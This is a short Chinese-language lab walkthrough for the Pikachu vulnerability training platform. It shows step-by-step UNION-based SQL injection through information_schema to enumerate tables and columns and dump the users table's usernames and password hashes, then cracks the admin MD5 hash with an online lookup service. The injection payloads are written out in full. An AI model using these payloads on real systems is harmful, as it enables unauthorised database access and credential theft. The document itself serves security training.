# Pikachu漏洞练习平台之SQL注入之-利用information\_schema注入案例

1、确认存在漏洞

![](../Images/ed274d6b95d5326a43aaedc3f463727b.png)

![](../Images/5519aae114ebc0e1d01361358e9d0d9b.png)

根据错误提示，单引号参与了SQL的执行，我们确定存在注入漏洞2、利用order by报错确认主查询里有多少个字段用order by 5 查询报错，提示没有第5列，折半查找，再使用order by 3尝试仍然报错：

![](../Images/d27de25979f0953670242ccd40214923.png)

![](../Images/30388d00c0ffc0d9803182c0eaf71836.png)

继续用order by 2尝试，没有报错，说明主查询里是2个字段。3、构造payload爆出数据库名：xx'union select database(),1;  #

![](../Images/a5d97c83971964b79783fc476ca0e532.png)

4、构造payload，通过information\_schema查询pikachu数据库有哪些表：xx' union select table\_name,1 from information\_schema.tables where table\_schema='pikachu'#或xx' union select table\_name,1 from information\_schema.columns where table\_schema='pikachu'#结果显示，pikachu数据库中有5张表：

![](../Images/7eb3c536da7389819199824c51bde03e.png)

5、构造payload，继续查询users表中有哪些字段：xx'union select column\_name,1 from information\_schema.columns wheretable\_name='users' #查出了users表中的所有字段：

![](../Images/26f81f3c66805edd409274ff8dff0ae6.png)

6、最后查出当前数据库pikachu、表users，可以构造一个payload查出users表中的username和password字段的值：xx'union select username,password from users #

![](../Images/0b0e76d286027b1cf64cd002abc801fe.png)

到此为止，我们已经知道了数据库中有三个用户及其密码，尝试用md5解密网站（https://www.cmd5.com/）破解用户密码：

![](../Images/53268f1ba7652582d209d9f04f7eba01.png)

得到admin用户的密码是123456.
